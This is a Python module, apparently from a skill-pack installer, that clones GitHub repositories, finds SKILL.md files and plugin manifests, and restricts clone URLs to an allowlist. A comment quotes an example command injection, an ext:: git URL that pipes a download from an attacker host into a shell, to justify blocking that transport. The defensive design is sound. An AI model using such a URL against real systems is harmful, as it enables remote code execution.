"""Repository analyzer for intelligent skill pack installation."""

from __future__ import annotations

import json
import logging
import re
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

from vibesop.core.skills.parser import parse_skill_md

logger = logging.getLogger(__name__)


def capture_rev(dest: Path) -> str:
    """Return ``git -C <dest> rev-parse HEAD`` (the cloned commit SHA).

    Must run before ``.git`` is removed. Returns "" if HEAD can't be determined
    (e.g. a shallow-clone anomaly) — callers then rely on the content sha256.
    """
    try:
        result = subprocess.run(
            ["git", "-C", str(dest), "rev-parse", "HEAD"],
            capture_output=True,
            text=True,
            timeout=10,
            check=True,
        )
        return result.stdout.strip()
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
        return ""


@dataclass
class RepoAnalysis:
    pack_name: str
    source_url: str
    skill_files: list[Path] = field(default_factory=list)
    readme_path: Path | None = None
    readme_install_hint: str = ""
    setup_scripts: list[str] = field(default_factory=list)
    detected_namespace: str = ""
    errors: list[str] = field(default_factory=list)

    @property
    def skill_count(self) -> int:
        return len(self.skill_files)

    @property
    def has_readme(self) -> bool:
        return self.readme_path is not None

    def skill_ids(self) -> list[str]:
        ids = []
        for sf in self.skill_files:
            meta = parse_skill_md(sf)
            ids.append(meta.id if meta else sf.parent.name)
        return ids


_GITHUB_TREE_RE = re.compile(r"^https://github\.com/([^/]+)/([^/]+)/tree/([^/]+)/(.+)$")
_GITHUB_BLOB_RE = re.compile(r"^https://github\.com/([^/]+)/([^/]+)/blob/([^/]+)/(.+)$")


def parse_github_url(url: str) -> tuple[str, str | None]:
    """Decompose a GitHub web URL into (clone_url, subdirectory)."""
    m = _GITHUB_TREE_RE.match(url)
    if m:
        owner, repo, _branch, subdir = m.groups()
        return f"https://github.com/{owner}/{repo}.git", subdir.rstrip("/")

    m = _GITHUB_BLOB_RE.match(url)
    if m:
        owner, repo, _branch, filepath = m.groups()
        parts = filepath.split("/")
        subdir = "/".join(parts[:-1]) if len(parts) > 1 else None
        return f"https://github.com/{owner}/{repo}.git", subdir

    return url, None


class RepoAnalyzer:
    @staticmethod
    def _parse_github_url(url: str) -> tuple[str, str | None]:
        """Decompose a GitHub web URL into (clone_url, subdirectory)."""
        return parse_github_url(url)

    def analyze(self, url: str, pack_name: str | None = None) -> RepoAnalysis:
        inferred_name = pack_name or self.infer_pack_name(url)
        result = RepoAnalysis(pack_name=inferred_name, source_url=url)

        repo_url, subdirectory = self._parse_github_url(url)

        with tempfile.TemporaryDirectory(prefix="vibe-install-") as tmpdir:
            tmpdir_path = Path(tmpdir)
            if not self.git_clone(repo_url, tmpdir_path):
                result.errors.append(f"Failed to clone repository: {repo_url}")
                return result

            search_root = tmpdir_path
            if subdirectory:
                search_root = tmpdir_path / subdirectory
                if not search_root.is_dir():
                    result.errors.append(f"Subdirectory '{subdirectory}' not found in repository")
                    return result

            for readme_name in ("README.md", "README.rst", "README.txt", "README"):
                readme = search_root / readme_name
                if not readme.exists():
                    readme = tmpdir_path / readme_name
                if readme.exists():
                    result.readme_path = readme
                    result.readme_install_hint = self._extract_install_hint(readme)
                    break

            # Discover SKILL.md files (standard format)
            result.skill_files = list(search_root.rglob("SKILL.md"))

            # Also discover via .claude-plugin/plugin.json (mattpocock format)
            plugin_json = tmpdir_path / ".claude-plugin" / "plugin.json"
            if plugin_json.exists():
                try:
                    plugin_data = json.loads(plugin_json.read_text())
                    plugin_skills = plugin_data.get("skills", [])
                    for skill_entry in plugin_skills:
                        if isinstance(skill_entry, str):
                            skill_dir = tmpdir_path / skill_entry
                            skill_md = (
                                skill_dir / "SKILL.md"
                                if skill_dir.is_dir()
                                else tmpdir_path / f"{skill_entry}.md"
                            )
                        elif isinstance(skill_entry, dict):
                            skill_path = skill_entry.get("path", "")
                            skill_dir = tmpdir_path / skill_path
                            skill_md = skill_dir / "SKILL.md" if skill_dir.is_dir() else None
                        else:
                            continue

                        if skill_md and skill_md.exists() and skill_md not in result.skill_files:
                            result.skill_files.append(skill_md)
                except (json.JSONDecodeError, KeyError) as e:
                    logger.debug("Failed to parse plugin.json: %s", e)

            # If no SKILL.md found but README mentions skills, flag for LLM-based analysis
            if not result.skill_files and result.readme_path:
                result.readme_install_hint = (
                    result.readme_install_hint + "\n\n"
                    "[Note] No SKILL.md files found. Use --smart to analyze README with LLM for installation instructions."
                )

            for script_name in (
                "setup.py",
                "pyproject.toml",
                "package.json",
                "Makefile",
                "requirements.txt",
            ):
                if (tmpdir_path / script_name).exists():
                    result.setup_scripts.append(script_name)

            for build_script in (".vibesop-build", "BUILD.sh", "setup.sh"):
                script_path = tmpdir_path / build_script
                if script_path.exists() and script_path.is_file():
                    result.setup_scripts.append(build_script)

            if result.skill_files:
                meta = parse_skill_md(result.skill_files[0])
                if meta and meta.namespace and meta.namespace != "builtin":
                    result.detected_namespace = meta.namespace
                else:
                    result.detected_namespace = inferred_name

        return result

    # URL schemes allowed for ``git_clone``. ``ext::`` is excluded because
    # git's ext transport executes arbitrary shell commands (e.g.
    # ``ext::sh -c 'curl attacker|sh' %s %s``) BEFORE our pre-install audit
    # gate (introduced v7.0.1) ever sees the cloned content. ``file://`` is
    # excluded because it bypasses network controls and can read arbitrary
    # local paths. See S29 handoff / v7.0.6 CHANGELOG.
    _GIT_ALLOWED_URL_PREFIXES: tuple[str, ...] = (
        "https://",
        "git@",
        "ssh://git@",
    )

    @classmethod
    def _is_safe_git_url(cls, url: str) -> bool:
        """Return True iff ``url`` is on the git URL allowlist.

        Defends against the ``ext::`` RCE primitive (git transport command
        injection). ``::`` is rejected anywhere in the URL because the
        ``ext::`` transport marker can be preceded by aliases.
        """
        if not url:
            return False
        if "::" in url:
            return False
        return url.startswith(cls._GIT_ALLOWED_URL_PREFIXES)

    def git_clone(self, url: str, dest: Path) -> bool:
        if not self._is_safe_git_url(url):
            logger.warning(
                "Refusing git clone of URL with disallowed scheme: %r "
                "(only %s are allowed; ext:: and file:: are blocked to "
                "prevent transport-level RCE)",
                url,
                self._GIT_ALLOWED_URL_PREFIXES,
            )
            return False
        try:
            subprocess.run(
                [
                    "git",
                    "clone",
                    "--depth",
                    "1",
                    # Belt-and-suspenders: even if a future contributor
                    # relaxes the URL allowlist, the protocol.ext.allow=never
                    # config blocks the ext:: transport at the git level.
                    "-c",
                    "protocol.ext.allow=never",
                    "-c",
                    "protocol.file.allow=user",
                    url,
                    str(dest),
                ],
                check=True,
                capture_output=True,
                text=True,
                timeout=60,
            )
            return True
        except subprocess.CalledProcessError as e:
            logger.debug(f"Git clone failed for {url}: {e.stderr}")
        except FileNotFoundError:
            logger.debug("git command not found")
        except subprocess.TimeoutExpired:
            logger.debug(f"Git clone timed out for {url}")
        return False

    def infer_pack_name(self, url: str) -> str:
        clean = url.rstrip("/").removesuffix(".git")
        if "/" in clean:
            return clean.split("/")[-1]
        return clean or "unknown-pack"

    def _extract_install_hint(self, readme_path: Path) -> str:
        try:
            content = readme_path.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            return ""

        match = re.search(
            r"#+\s*[Ii]nstallation.*?(?:\n#+\s*|\Z)",
            content,
            re.DOTALL,
        )
        if match:
            return "\n".join(match.group(0).split("\n")[:10]).strip()

        match = re.search(
            r"`pip install[^`]+`|`make[^`]+`|`npm install[^`]+`",
            content,
        )
        if match:
            return f"Setup command detected: {match.group(0)}"

        return "No explicit installation instructions found."
